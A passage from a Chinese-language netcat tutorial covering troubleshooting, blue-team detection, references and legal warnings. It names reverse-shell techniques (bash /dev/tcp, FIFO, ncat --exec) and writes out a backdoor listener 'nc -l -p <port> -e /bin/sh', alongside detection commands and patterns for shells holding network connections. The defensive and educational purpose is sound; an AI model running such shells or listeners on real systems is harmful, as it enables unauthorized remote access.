| **经典版 `-l` 只接受一个连接就退出** | 经典版语义如此 | 用 **`ncat -l -k`** 或 **`socat ...,fork`**；或循环重跑 |
| `-k` 不生效 / 行为怪 | **经典版 `-k` 是 keepalive，不是持续监听** | 确认 `readlink -f $(command -v nc)`；要持续监听用 ncat |
| `nc -l 4444`（不带 `-p`）不监听 | 某些版本把 `4444` 当主机名解析 | **统一写 `nc -l -p 4444`**（兼容性最好） |
| `-e` 报 `invalid option` | 你用的是 **openbsd 版**（已移除 `-e`） | 用 FIFO 法、`bash /dev/tcp`、或 `ncat --exec` |
| 反向 shell 连不上 | 目标出站被拦 / IP 写错 / 监听端没起 | 先用 `nc -zv` 测「目标能否连出到你的端口」 |
| 拿到 shell 但很多命令报错 | **没有 TTY** | 升级 pty（python `pty.spawn` / socat `pty`） |
| `nc -zv` 报 `succeeded` 但 nmap 说 closed | 扫描时机/防火墙状态变化；或 nmap 被限速 | 以 `nc` 的即时结果为准，重复确认 |
| 扫描很慢 | 对「被过滤」的端口要等超时 | 加 `-w 1`；或用 nmap（并行） |
| UDP 测试没反应 | UDP 无连接，**「没反应」本身就是正常结果** | 加 `-w` 超时；理解「UDP 扫描天然不可靠」 |
| 传输文件后哈希不一致 | 没等发完就断开 / 中途有丢包 | 加 `-q`；**必须校验哈希**；大文件用 scp |
| 传输中文/二进制被破坏 | 终端或换行符处理（如 `-C`）介入 | **不要走终端**（用管道/重定向）；必要时用 `-C` 明确换行策略 |
| `-o` 的 hex dump 看不懂 | 是十六进制 + 方向标记格式 | 用 `xxd`/`hexdump` 辅助阅读；或直接用 tcpdump 抓 |
| 监听被人连上（意外的） | **监听在 `0.0.0.0` 且没有访问控制** | **绑定 `127.0.0.1`**；用 `ncat --allow`；或防火墙限制 |
| `-e` 监听后被当作后门 | **`-e` 监听 = 开放后门** | **绝不在共享/公网主机上用 `-e` 监听** |

---

## 9. 防御视角（蓝队）

`nc` 是攻击者的常用工具，**正因为如此，它也是蓝队最好的检测目标之一**。

| 攻击者行为 | 检测思路 | 加固手段 |
|------------|----------|----------|
| **反向 shell**（目标连出到公网某端口） | 出站连接审计：**非标准高端口的长连接**、进程 `nc`/`bash` 主动外连 | 出站白名单；限制服务器可出站目标；EDR 监控 `nc` 外连 |
| **正向 shell**（开放 4444 等端口） | 资产/端口巡检：**不该有的 LISTEN 端口**；`ss -lntp` 里出现 `nc` | 主机防火墙默认拒绝入站；HIDS 监控新监听端口 |
| `-e` 打开后门 | 进程树里 `nc` 与 `sh`/`bash` 关联；`/proc/<pid>/cmdline` 含 `-e` | **禁用/卸载非必要的 nc**；或用 sudo 策略限制 |
| `nc` 做端口扫描 | 短时间内大量连接尝试（SYN 或无载荷连接） | IDS 规则（见 [`snort.md`](../02-漏洞分析/snort.md)）；连接速率限制 |
| `nc` 传文件外带数据 | **短时间内出站大流量**；异常目标 | 出站流量审计；DLP |
| `/dev/tcp` 反弹 | 进程是 `bash`，但有外部 socket | EDR 关注「shell 进程持有网络连接」 |
| nc 监听接受外部连接（蜜罐反被用） | 监听进程 + 已建立连接的来源是外部 | 主机防火墙；网络分段 |

**蓝队的六条硬建议**：

1. **默认拒绝入站**：服务器不需要的端口全关。**攻击者的 bind shell 就失去意义**；
2. **出站也做限制**：允许的出口域名/IP 白名单，**这是拦反向 shell 最有效的手段**；
3. **监控「shell 进程持有网络连接」**：`bash`/`sh`/`python` 直接对外建连是强异常信号；
4. **监控新出现的 LISTEN 端口**（尤其是高端口）——`ss -lntp` 定期采集对比；
5. **告警「短时间大量半开连接」**（扫描特征）；
6. **生产主机不装用不到的 netcat**（缩小攻击者「就地取材」的工具面）。如果装了，注意**两种 nc 的 `-e` 差异**（openbsd 版没有 `-e`，反而更安全）。

**"nc 相关"的检测命令（防御方自查）**：

```bash
# 本机有没有可疑的监听端口
sudo ss -lntp
# 本机有没有 nc 进程在跑（含参数，能看到 -e / -l）
ps -ef | grep -E '[n]c(\.traditional)?\s' 
# 本机有没有 shell 进程持有外部连接
sudo ss -tnp | grep -E 'bash|sh|python'
# 快速排查：谁在连出到公网高端口
sudo ss -tnp state established '( dport >= :1024 )' | grep -v '127.0.0.1'
```

**蜜罐用法（蓝队也能用 nc 做好事）**：在一个不用的端口上放 `nc -l -p 4444` 之类的**简单监听器**，任何连上来的都是扫描/探测行为——**但这种方法本身也有限**（攻击者能识别），且**不要在企业网络擅自部署蜜罐**（需合规审批）。

---

## 10. 参考

- Kali 工具页（含 `nc.traditional -h` 原文）：<https://www.kali.org/tools/netcat/>
- Kali 包跟踪：<https://pkg.kali.org/pkg/netcat>
- 上游（经典 nc，Hobbit 版）说明：<http://www.stearns.org/nc/>
- Debian 的另一个实现：`netcat-openbsd`（`apt install netcat-openbsd`）
- 现代替代：
  - **`ncat`**（Nmap 项目）：<https://nmap.org/ncat/>
  - **`socat`**：<http://www.dest-unreach.org/socat/>（本地教程见 [`../12-基础设施与C2/socat.md`](../12-基础设施与C2/socat.md)）
- 本地命令：`nc.traditional -h`、`nc -h`（openbsd 风格）、`readlink -f $(command -v nc)`、`update-alternatives --display nc`
- 配套教程：[`../01-信息搜集/nmap.md`](../01-信息搜集/nmap.md)、[`../12-基础设施与C2/socat.md`](../12-基础设施与C2/socat.md)、[`../06-漏洞利用/msfvenom.md`](../06-漏洞利用/msfvenom.md)、[`../08-后渗透/chisel.md`](../08-后渗透/chisel.md)、[`../07-嗅探与欺骗/tcpdump.md`](../07-嗅探与欺骗/tcpdump.md)

## ⚠️ 法律与伦理

`nc` 是**最容易被误用的工具之一**——它的「正常用法」和「攻击用法」在命令字面上几乎一样：

**① 端口扫描**

- 扫描**非自有、非授权**主机的端口，属于《网络安全法》第 27 条禁止的「干扰他人网络」行为；大规模扫描还可能构成《刑法》第 285 条（非法获取计算机信息系统数据）或第 286 条（破坏计算机信息系统）；
- **只扫你拥有或获得书面授权的主机**。

**② 正/反向 shell（最容易触犯刑法）**

- `nc -l -p <port> -e /bin/sh` **就是开一个远程后门**；
- 在**任何非自有/非授权系统**上执行反向 shell，即构成**未授权访问**：

  - 《刑法》第 285 条：非法侵入计算机信息系统、非法获取计算机信息系统数据；
  - 《刑法》第 286 条：**非法控制计算机信息系统**（「控制」正是拿到 shell 的含义）；
  - 《刑法》第 285 条之三：**提供侵入、非法控制计算机信息系统的程序、工具**（把这类 payload 分享出去也可能违法）。

**③ 文件传输 / 数据外带**

- 用 nc 从他人系统取数据 = 窃取数据；
- 把自己系统上的敏感数据用 nc 明文传出 = 数据泄露风险（**明文、无认证**）。

**④ 明文与无认证的固有风险**

- nc 的流量**完全明文、无任何认证**；
- 因此**容易被中间人窃听/篡改**，也**容易被 IDS 识别**；
- 涉及凭据的场景**绝不能**用裸 nc。

**必须遵守**：

1. **只在自有机器、自建靶场（本地虚拟机 / Docker / Metasploitable）或获得书面授权的目标上使用**；
2. **所有 shell 相关练习都用回环地址 `127.0.0.1` 或隔离实验网**，且练习结束**立即杀掉进程**；
3. **监听端口务必绑定 `127.0.0.1`**，绝不在共享/公网主机上监听（更不要带 `-e`）；
4. **不要在真实网络中部署「后门式」监听**，即使是「方便自己」；
5. **生产环境传文件用 `scp`/`rsync`**（有加密和认证），不要用 nc；
6. **报告与文档中的 payload 要脱敏**，不传播可直接利用的完整链条；
7. 发现他人系统上存在这类后门，应通过**正式渠道上报**，不得擅自利用。
